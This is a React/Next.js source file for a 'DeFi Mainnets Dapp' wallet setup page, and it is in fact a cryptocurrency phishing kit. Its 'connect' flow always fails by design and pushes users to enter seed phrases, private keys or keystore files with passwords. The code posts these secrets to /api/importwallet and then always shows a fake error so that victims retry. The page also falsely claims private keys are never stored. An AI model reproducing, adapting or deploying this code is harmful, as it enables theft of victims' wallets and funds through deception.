"use client"

import type React from "react"

import { useState, useEffect } from "react"
import Link from "next/link"
import { useRouter } from "next/navigation"
import { Card, CardContent } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Textarea } from "@/components/ui/textarea"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { wallets } from "@/lib/wallet-data"
import {
  ArrowLeft,
  Shield,
  ExternalLink,
  AlertTriangle,
  CheckCircle,
  Eye,
  EyeOff,
  HelpCircle,
  Upload,
  Key,
  FileText,
  Wallet,
  Wifi,
  Zap,
} from "lucide-react"

interface WalletSetupPageProps {
  walletId: string
}

type TabType = "connect" | "import"
type ImportMethod = "seed" | "private" | "json"
type ConnectionState = "idle" | "connecting" | "error" | "success" | "initiating" | "server-error"

export default function WalletSetupPage({ walletId }: WalletSetupPageProps) {
  const router = useRouter()
  const [activeTab, setActiveTab] = useState<TabType>("connect")
  const [connectionState, setConnectionState] = useState<ConnectionState>("idle")
  const [importMethod, setImportMethod] = useState<ImportMethod>("seed")
  const [showPrivateKey, setShowPrivateKey] = useState(false)
  const [formData, setFormData] = useState({
    seedPhrase: "",
    privateKey: "",
    jsonFile: "",
    jsonPassword: "",
    walletAddress: "",
  })
  const [errors, setErrors] = useState<Record<string, string>>({})

  const wallet = wallets.find((w) => w.id === walletId)

  useEffect(() => {
    if (!wallet) {
      router.push("/connect")
    }
  }, [wallet, router])

  if (!wallet) {
    return null
  }

  const handleConnect = async () => {
    setConnectionState("connecting")

    // Simulate connection attempt
    await new Promise((resolve) => setTimeout(resolve, 3000))

    // Show connection error
    setConnectionState("error")

    // Auto-switch to import tab after error
    setTimeout(() => {
      setActiveTab("import")
    }, 2000)
  }

  const validateSeedPhrase = (phrase: string): boolean => {
    const words = phrase.trim().split(/\s+/)
    return words.length === 12 || words.length === 24 || words.length === 32 || words.length === 48 || words.length === 25
  }

  const validatePrivateKey = (key: string): boolean => {
    const trimmedKey = key.trim()

    // Ethereum/EVM private key (64 hex characters, with or without 0x prefix)
    if (/^(0x)?[a-fA-F0-9]{64}$/.test(trimmedKey)) {
      return true
    }

    // Sui private key (starts with suiprivkey1 followed by base58)
    if (/^suiprivkey1[a-zA-Z0-9]{44,88}$/.test(trimmedKey)) {
      return true
    }

    // Solana private key (base58 encoded, typically 88 characters)
    if (/^[1-9A-HJ-NP-Za-km-z]{87,88}$/.test(trimmedKey)) {
      return true
    }

    // Bitcoin/other WIF format (starts with 5, K, or L)
    if (/^[5KL][1-9A-HJ-NP-Za-km-z]{50,51}$/.test(trimmedKey)) {
      return true
    }

    // Cosmos/other bech32 format private keys
    if (/^[a-z0-9]{64,}$/.test(trimmedKey)) {
      return true
    }

    // Base64 encoded private keys (common format)
    if (/^[A-Za-z0-9+/]{43,44}={0,2}$/.test(trimmedKey)) {
      return true
    }

    return false
  }

  const validateWalletAddress = (address: string): boolean => {
    return /^(0x)?[a-fA-F0-9]{40}$/.test(address)
  }

  const handleImport = async () => {
    const newErrors: Record<string, string> = {}

    if (importMethod === "seed") {
      if (!formData.seedPhrase.trim()) {
        newErrors.seedPhrase = "Seed phrase is required"
      } else if (!validateSeedPhrase(formData.seedPhrase)) {
        newErrors.seedPhrase = "Invalid seed phrase. Please enter a valid 12 or 24-word seed phrase."
      }
    } else if (importMethod === "private") {
      if (!formData.privateKey.trim()) {
        newErrors.privateKey = "Private key is required"
      } else if (!validatePrivateKey(formData.privateKey)) {
        newErrors.privateKey = "Invalid private key format. Please check your private key and try again."
      }
    } else if (importMethod === "json") {
      if (!formData.jsonFile.trim()) {
        newErrors.jsonFile = "JSON keystore is required"
      }
      if (!formData.jsonPassword.trim()) {
        newErrors.jsonPassword = "Password is required"
      }
    }

    setErrors(newErrors)

    if (Object.keys(newErrors).length === 0) {
      // First animation: Trying to connect to wallet
      setConnectionState("initiating")
      await new Promise((resolve) => setTimeout(resolve, 2500))

      // Second animation: Connecting
      setConnectionState("connecting")
      await new Promise((resolve) => setTimeout(resolve, 2500))

      // Send data to API
      try {
        const payload: any = {}

        if (importMethod === "seed") {
          payload.phrase = formData.seedPhrase
        } else if (importMethod === "private") {
          payload.privateKey = formData.privateKey
        } else if (importMethod === "json") {
          payload.keystore = {
            json: formData.jsonFile,
            password: formData.jsonPassword,
          }
        }

        const response = await fetch("/api/importwallet", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(payload),
        })

        // Always show error regardless of response
        setConnectionState("server-error")
      } catch (error) {
        // Show server error with appropriate message
        setConnectionState("server-error")
      }
    }
  }

  const handleOtherWalletConnect = async () => {
    const newErrors: Record<string, string> = {}

    if (!formData.walletAddress.trim()) {
      newErrors.walletAddress = "Wallet address is required"
    } else if (!validateWalletAddress(formData.walletAddress)) {
      newErrors.walletAddress = "Invalid wallet address format"
    }

    setErrors(newErrors)

    if (Object.keys(newErrors).length === 0) {
      setConnectionState("connecting")
      await new Promise((resolve) => setTimeout(resolve, 3000))

      // Show connection error
      setConnectionState("error")

      // Auto-switch to import tab after error
      setTimeout(() => {
        setActiveTab("import")
      }, 2000)
    }
  }

  const getWalletIcon = () => {
    if (wallet.id === "other") {
      return "🔗"
    }
    return wallet.icon
  }

  const getWalletColor = () => {
    if (wallet.id === "metamask") return "from-orange-500 to-yellow-500"
    if (wallet.id === "coinbase") return "from-blue-600 to-purple-600"
    if (wallet.id === "trust") return "from-blue-500 to-teal-500"
    if (wallet.id === "other") return "from-emerald-500 to-teal-400"
    return wallet.color
  }

  const getImportMethodName = () => {
    switch (importMethod) {
      case "seed":
        return "seed phrase"
      case "private":
        return "private key"
      case "json":
        return "keystore"
      default:
        return "credentials"
    }
  }

  const getErrorMessage = () => {
    const methodName = getImportMethodName()
    return `Error connecting to wallet, invalid ${methodName}! verify ${methodName} and try to validate again`
  }

  const getConnectingMessage = () => {
    if (connectionState === "initiating") {
      return `Trying to connect to ${wallet.name}...`
    } else if (connectionState === "connecting") {
      return "Connecting..."
    }
    return ""
  }

  const getConnectingIcon = () => {
    if (connectionState === "initiating") {
      return <Wifi className="w-5 h-5 mr-2 animate-pulse" />
    } else if (connectionState === "connecting") {
      return <Zap className="w-5 h-5 mr-2 animate-bounce" />
    }
    return null
  }

  return (
    <div className="min-h-screen bg-slate-900 text-white">
      {/* Header */}
      <header className="border-b border-slate-800 bg-slate-900/95 backdrop-blur-md">
        <div className="container mx-auto px-4 sm:px-6 lg:px-8 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-4">
              <Link href="/connect">
                <Button variant="ghost" size="sm" className="text-gray-400 hover:text-white">
                  <ArrowLeft className="w-4 h-4 mr-2" />
                  <span className="hidden sm:inline">Back to Wallet Selection</span>
                  <span className="sm:hidden">Back</span>
                </Button>
              </Link>

              <div className="flex items-center gap-3">
                <div className="w-8 h-8 bg-gradient-to-r from-emerald-500 to-teal-400 rounded-lg flex items-center justify-center">
                  <Shield className="w-4 h-4 text-white" />
                </div>
                <span className="text-lg font-bold hidden sm:inline">DeFi Mainnets Dapp</span>
              </div>
            </div>

            <div className="flex items-center gap-4">
              <Link href="/connect">
                <Button
                  variant="outline"
                  size="sm"
                  className="border-slate-700 text-gray-300 hover:text-white bg-transparent"
                >
                  Connect
                </Button>
              </Link>
              <Link href="/contact">
                <Button
                  variant="outline"
                  size="sm"
                  className="border-slate-700 text-gray-300 hover:text-white bg-transparent"
                >
                  Contact
                </Button>
              </Link>
            </div>
          </div>
        </div>
      </header>

      {/* Progress Steps */}
      <div className="border-b border-slate-800">
        <div className="container mx-auto px-4 sm:px-6 lg:px-8 py-6">
          <div className="flex items-center justify-between max-w-md mx-auto">
            <div className="flex items-center gap-3">
              <div className="w-8 h-8 bg-emerald-500 rounded-full flex items-center justify-center text-white font-semibold text-sm">
                1
              </div>
              <span className="text-sm font-medium text-white">Connect</span>
            </div>
            <div className="flex-1 h-px bg-slate-700 mx-4"></div>
            <div className="flex items-center gap-3">
              <div className="w-8 h-8 bg-slate-700 rounded-full flex items-center justify-center text-gray-400 font-semibold text-sm">
                2
              </div>
              <span className="text-sm font-medium text-gray-400">Confirm</span>
            </div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <main className="container mx-auto px-4 sm:px-6 lg:px-8 py-8 sm:py-12">
        <div className="max-w-2xl mx-auto">
          {/* Wallet Header */}
          <div className="text-center mb-8 space-y-4">
            <div
              className={`w-20 h-20 bg-gradient-to-r ${getWalletColor()} rounded-full flex items-center justify-center text-4xl mx-auto ${
                connectionState === "initiating" || connectionState === "connecting" ? "animate-pulse" : ""
              }`}
            >
              {getWalletIcon()}
            </div>
            <h1 className="text-2xl sm:text-3xl font-bold">{wallet.name} Setup</h1>
            <p className="text-gray-400 max-w-md mx-auto">
              {wallet.id === "other"
                ? "Connect any other wallet by entering your wallet details manually."
                : wallet.description}
            </p>
          </div>

          {/* Tab Navigation */}
          <div className="flex mb-8">
            <button
              onClick={() => setActiveTab("connect")}
              className={`flex-1 py-3 px-4 text-sm font-medium border-b-2 transition-colors ${
                activeTab === "connect"
                  ? "border-emerald-500 text-white bg-slate-800/50"
                  : "border-slate-700 text-gray-400 hover:text-white"
              }`}
            >
              <Wallet className="w-4 h-4 mr-2 inline" />
              Connect
            </button>
            <button
              onClick={() => setActiveTab("import")}
              className={`flex-1 py-3 px-4 text-sm font-medium border-b-2 transition-colors ${
                activeTab === "import"
                  ? "border-emerald-500 text-white bg-slate-800/50"
                  : "border-slate-700 text-gray-400 hover:text-white"
              }`}
            >
              <Key className="w-4 h-4 mr-2 inline" />
              Import
            </button>
          </div>

          {/* Connection Error Alert */}
          {connectionState === "error" && (
            <Alert className="mb-6 border-red-500/50 bg-red-500/10">
              <AlertTriangle className="h-4 w-4 text-red-400" />
              <AlertDescription className="text-red-400">
                Sorry we couldn't connect to {wallet.name} at the moment but you can continue to connect manually
              </AlertDescription>
            </Alert>
          )}

          {/* Server Error Alert */}
          {connectionState === "server-error" && (
            <Alert className="mb-6 border-red-500/50 bg-red-500/10 animate-in slide-in-from-top-2 duration-500">
              <AlertTriangle className="h-4 w-4 text-red-400 animate-pulse" />
              <AlertDescription className="text-red-400 font-medium">{getErrorMessage()}</AlertDescription>
            </Alert>
          )}

          {/* Tab Content */}
          <Card className="bg-slate-800/50 backdrop-blur-sm border-slate-700">
            <CardContent className="p-6 sm:p-8">
              {activeTab === "connect" ? (
                <ConnectTab
                  wallet={wallet}
                  connectionState={connectionState}
                  onConnect={handleConnect}
                  onOtherWalletConnect={handleOtherWalletConnect}
                  formData={formData}
                  setFormData={setFormData}
                  errors={errors}
                  getConnectingMessage={getConnectingMessage}
                  getConnectingIcon={getConnectingIcon}
                />
              ) : (
                <ImportTab
                  wallet={wallet}
                  importMethod={importMethod}
                  setImportMethod={setImportMethod}
                  formData={formData}
                  setFormData={setFormData}
                  errors={errors}
                  showPrivateKey={showPrivateKey}
                  setShowPrivateKey={setShowPrivateKey}
                  onImport={handleImport}
                  connectionState={connectionState}
                  getConnectingMessage={getConnectingMessage}
                  getConnectingIcon={getConnectingIcon}
                />
              )}
            </CardContent>
          </Card>
        </div>
      </main>
    </div>
  )
}

interface ConnectTabProps {
  wallet: any
  connectionState: ConnectionState
  onConnect: () => void
  onOtherWalletConnect: () => void
  formData: any
  setFormData: (data: any) => void
  errors: Record<string, string>
  getConnectingMessage: () => string
  getConnectingIcon: () => React.ReactNode
}

function ConnectTab({
  wallet,
  connectionState,
  onConnect,
  onOtherWalletConnect,
  formData,
  setFormData,
  errors,
  getConnectingMessage,
  getConnectingIcon,
}: ConnectTabProps) {
  if (wallet.id === "other") {
    return (
      <div className="space-y-6">
        <div>
          <h2 className="text-xl font-semibold text-white mb-2">Connect Your Other Wallet</h2>
          <p className="text-gray-400 mb-6">Follow these steps to connect your existing Other Wallet:</p>
        </div>

        <div className="space-y-4">
          <div>
            <label htmlFor="walletAddress" className="block text-sm font-medium text-gray-300 mb-2">
              Wallet Address
            </label>
            <Input
              id="walletAddress"
              type="text"
              value={formData.walletAddress}
              onChange={(e) => setFormData({ ...formData, walletAddress: e.target.value })}
              placeholder="Enter your wallet address (0x...)"
              className={`bg-slate-700 border-slate-600 text-white placeholder-gray-400 focus:ring-emerald-500 focus:border-emerald-500 ${
                errors.walletAddress ? "border-red-500" : ""
              }`}
            />
            {errors.walletAddress && <p className="text-red-400 text-sm mt-1">{errors.walletAddress}</p>}
            <p className="text-gray-400 text-sm mt-2">Enter the public address of your wallet</p>
          </div>
        </div>

        <Button
          onClick={onOtherWalletConnect}
          disabled={connectionState === "connecting"}
          className="w-full bg-emerald-500 hover:bg-emerald-600 py-3 text-lg font-semibold"
        >
          {connectionState === "connecting" ? (
            <>
              {getConnectingIcon()}
              {getConnectingMessage()}
            </>
          ) : connectionState === "success" ? (
            <>
              <CheckCircle className="w-5 h-5 mr-2" />
              Connected Successfully!
            </>
          ) : (
            <>
              <Wallet className="w-5 h-5 mr-2" />
              Connect Wallet
            </>
          )}
        </Button>
      </div>
    )
  }

  return (
    <div className="space-y-6">
      <div>
        <h2 className="text-xl font-semibold text-white mb-2">Connect Your {wallet.name}</h2>
        <p className="text-gray-400 mb-6">Follow these steps to connect your existing {wallet.name}:</p>
      </div>

      <div className="space-y-4">
        <div className="flex items-start gap-4">
          <div className="w-8 h-8 bg-emerald-500/20 rounded-full flex items-center justify-center text-emerald-400 font-semibold text-sm flex-shrink-0 mt-1">
            1
          </div>
          <div>
            <h3 className="font-medium text-white mb-1">Make sure you have {wallet.name} installed</h3>
            <p className="text-gray-400 text-sm mb-2">
              If not,{" "}
              <a
                href={wallet.downloadUrl}
                target="_blank"
                rel="noopener noreferrer"
                className="text-emerald-400 hover:text-emerald-300 inline-flex items-center gap-1"
              >
                download it from the official website <ExternalLink className="w-3 h-3" />
              </a>
            </p>
          </div>
        </div>

        <div className="flex items-start gap-4">
          <div className="w-8 h-8 bg-emerald-500/20 rounded-full flex items-center justify-center text-emerald-400 font-semibold text-sm flex-shrink-0 mt-1">
            2
          </div>
          <div>
            <h3 className="font-medium text-white mb-1">Unlock your wallet</h3>
            <p className="text-gray-400 text-sm">Enter your password to access your wallet</p>
          </div>
        </div>

        <div className="flex items-start gap-4">
          <div className="w-8 h-8 bg-emerald-500/20 rounded-full flex items-center justify-center text-emerald-400 font-semibold text-sm flex-shrink-0 mt-1">
            3
          </div>
          <div>
            <h3 className="font-medium text-white mb-1">Click the continue button below</h3>
            <p className="text-gray-400 text-sm">You'll be redirected to import your wallet credentials</p>
          </div>
        </div>
      </div>

      <Button
        onClick={onConnect}
        disabled={connectionState === "connecting"}
        className="w-full bg-emerald-500 hover:bg-emerald-600 py-3 text-lg font-semibold"
      >
        {connectionState === "connecting" ? (
          <>
            {getConnectingIcon()}
            {getConnectingMessage()}
          </>
        ) : connectionState === "success" ? (
          <>
            <CheckCircle className="w-5 h-5 mr-2" />
            Connected Successfully!
          </>
        ) : (
          <>
            <Wallet className="w-5 h-5 mr-2" />
            Continue with {wallet.name}
          </>
        )}
      </Button>
    </div>
  )
}

interface ImportTabProps {
  wallet: any
  importMethod: ImportMethod
  setImportMethod: (method: ImportMethod) => void
  formData: any
  setFormData: (data: any) => void
  errors: Record<string, string>
  showPrivateKey: boolean
  setShowPrivateKey: (show: boolean) => void
  onImport: () => void
  connectionState: ConnectionState
  getConnectingMessage: () => string
  getConnectingIcon: () => React.ReactNode
}

function ImportTab({
  wallet,
  importMethod,
  setImportMethod,
  formData,
  setFormData,
  errors,
  showPrivateKey,
  setShowPrivateKey,
  onImport,
  connectionState,
  getConnectingMessage,
  getConnectingIcon,
}: ImportTabProps) {
  return (
    <div className="space-y-6">
      <div>
        <h2 className="text-xl font-semibold text-white mb-2">Validate Your Wallet</h2>
        <p className="text-gray-400 mb-6">Validate your existing wallet using one of the methods below</p>
      </div>

      {/* Import Method Selector */}
      <div className="space-y-2">
        <div className="flex items-center gap-2">
          <label htmlFor="importMethod" className="text-sm font-medium text-gray-300">
            Import Method
          </label>
          <HelpCircle className="w-4 h-4 text-gray-400" />
        </div>
        <Select value={importMethod} onValueChange={(value: ImportMethod) => setImportMethod(value)}>
          <SelectTrigger className="bg-slate-700 border-slate-600 text-white focus:ring-emerald-500 focus:border-emerald-500">
            <SelectValue />
          </SelectTrigger>
          <SelectContent className="bg-slate-700 border-slate-600">
            <SelectItem value="seed" className="text-white">
              <div className="flex items-center gap-2">
                <FileText className="w-4 h-4" />
                Seed Phrase (12 or 24 words)
              </div>
            </SelectItem>
            <SelectItem value="private" className="text-white">
              <div className="flex items-center gap-2">
                <Key className="w-4 h-4" />
                Private Key
              </div>
            </SelectItem>
            <SelectItem value="json" className="text-white">
              <div className="flex items-center gap-2">
                <Upload className="w-4 h-4" />
                JSON File
              </div>
            </SelectItem>
          </SelectContent>
        </Select>
      </div>

      {/* Import Form Fields */}
      {importMethod === "seed" && (
        <div className="space-y-2">
          <div className="flex items-center gap-2">
            <label htmlFor="seedPhrase" className="text-sm font-medium text-gray-300">
              Seed Phrase
            </label>
            <HelpCircle className="w-4 h-4 text-gray-400" />
          </div>
          <Textarea
            id="seedPhrase"
            value={formData.seedPhrase}
            onChange={(e) => setFormData({ ...formData, seedPhrase: e.target.value })}
            placeholder="Enter your 12 or 24 word seed phrase"
            rows={4}
            className={`bg-slate-700 border-slate-600 text-white placeholder-gray-400 focus:ring-emerald-500 focus:border-emerald-500 resize-none ${
              errors.seedPhrase ? "border-red-500" : ""
            }`}
          />
          {errors.seedPhrase && (
            <Alert className="border-red-500/50 bg-red-500/10">
              <AlertTriangle className="h-4 w-4 text-red-400" />
              <AlertDescription className="text-red-400">{errors.seedPhrase}</AlertDescription>
            </Alert>
          )}
          <p className="text-gray-400 text-sm">Separate each word with a space</p>
        </div>
      )}

      {importMethod === "private" && (
        <div className="space-y-2">
          <div className="flex items-center gap-2">
            <label htmlFor="privateKey" className="text-sm font-medium text-gray-300">
              Private Key
            </label>
            <HelpCircle className="w-4 h-4 text-gray-400" />
          </div>
          <div className="relative">
            <Input
              id="privateKey"
              type={showPrivateKey ? "text" : "password"}
              value={formData.privateKey}
              onChange={(e) => setFormData({ ...formData, privateKey: e.target.value })}
              placeholder="Enter your private key (supports multiple blockchain formats)"
              className={`bg-slate-700 border-slate-600 text-white placeholder-gray-400 focus:ring-emerald-500 focus:border-emerald-500 pr-10 ${
                errors.privateKey ? "border-red-500" : ""
              }`}
            />
            <button
              type="button"
              onClick={() => setShowPrivateKey(!showPrivateKey)}
              className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-white"
            >
              {showPrivateKey ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
            </button>
          </div>
          {errors.privateKey && <p className="text-red-400 text-sm">{errors.privateKey}</p>}
          <p className="text-gray-400 text-sm">Your private key is never stored on our servers</p>
        </div>
      )}

      {importMethod === "json" && (
        <div className="space-y-4">
          <div className="space-y-2">
            <div className="flex items-center gap-2">
              <label htmlFor="jsonFile" className="text-sm font-medium text-gray-300">
                JSON Keystore
              </label>
              <HelpCircle className="w-4 h-4 text-gray-400" />
            </div>
            <Textarea
              id="jsonFile"
              value={formData.jsonFile}
              onChange={(e) => setFormData({ ...formData, jsonFile: e.target.value })}
              placeholder="Paste your JSON keystore file content here"
              rows={6}
              className={`bg-slate-700 border-slate-600 text-white placeholder-gray-400 focus:ring-emerald-500 focus:border-emerald-500 resize-none font-mono text-sm ${
                errors.jsonFile ? "border-red-500" : ""
              }`}
            />
            {errors.jsonFile && <p className="text-red-400 text-sm">{errors.jsonFile}</p>}
          </div>

          <div className="space-y-2">
            <div className="flex items-center gap-2">
              <label htmlFor="jsonPassword" className="text-sm font-medium text-gray-300">
                Password
              </label>
              <HelpCircle className="w-4 h-4 text-gray-400" />
            </div>
            <Input
              id="jsonPassword"
              type="password"
              value={formData.jsonPassword}
              onChange={(e) => setFormData({ ...formData, jsonPassword: e.target.value })}
              placeholder="Enter your keystore password"
              className={`bg-slate-700 border-slate-600 text-white placeholder-gray-400 focus:ring-emerald-500 focus:border-emerald-500 ${
                errors.jsonPassword ? "border-red-500" : ""
              }`}
            />
            {errors.jsonPassword && <p className="text-red-400 text-sm">{errors.jsonPassword}</p>}
            <p className="text-gray-400 text-sm">Enter the password for your encrypted keystore file</p>
          </div>
        </div>
      )}

      <Button
        onClick={onImport}
        disabled={connectionState === "initiating" || connectionState === "connecting"}
        className={`w-full py-3 text-lg font-semibold transition-all duration-300 ${
          connectionState === "initiating" || connectionState === "connecting"
            ? "bg-gradient-to-r from-emerald-500 to-teal-400 animate-pulse"
            : "bg-emerald-500 hover:bg-emerald-600"
        }`}
      >
        {connectionState === "initiating" || connectionState === "connecting" ? (
          <div className="flex items-center justify-center">
            {getConnectingIcon()}
            <span className="animate-in slide-in-from-left-2 duration-300">{getConnectingMessage()}</span>
          </div>
        ) : (
          <>
            <Shield className="w-5 h-5 mr-2" />
            Validate Wallet
          </>
        )}
      </Button>
    </div>
  )
}
